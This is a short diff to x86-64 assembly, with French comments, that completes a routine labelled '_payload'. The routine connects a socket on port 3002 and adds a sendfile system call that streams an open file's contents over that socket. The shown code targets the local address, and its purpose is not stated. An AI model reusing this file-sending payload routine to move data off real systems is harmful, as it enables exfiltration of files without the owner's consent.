@@ -28,7 +28,6 @@ section .data
         ; - sin_zero: 8 octets
         ; Taille totale: 16 octets
         ; Nous définissons la structure en mémoire ici.
-        ; db 16                      ; sin_len
         dw 2                       ; sin_family (AF_INET)
         dw 0xba0b                  ; sin_port (3002 en hex)
         dd 0                       ; sin_addr (INADDR_ANY)
@@ -83,9 +82,13 @@ _payload:
     test rax, rax
     js error_connect
 
-    ; Envoyer le fichier (simplification, voir plus bas)
-    mov rax, 40 ; SYS_sendfile
-    ; ...
+	; Send the file
+	mov rax, 40						; SYS_sendfile
+	mov rdi, r13					; socket file descriptor
+	mov rsi, r12					; file descriptor
+	xor rdx, rdx					; offset (NULL)
+	mov r10, [rel stat_buffer + 48]	; size
+	syscall
 
     ; Fermer le fichier et la socket
     mov rax, 3 ; SYS_close
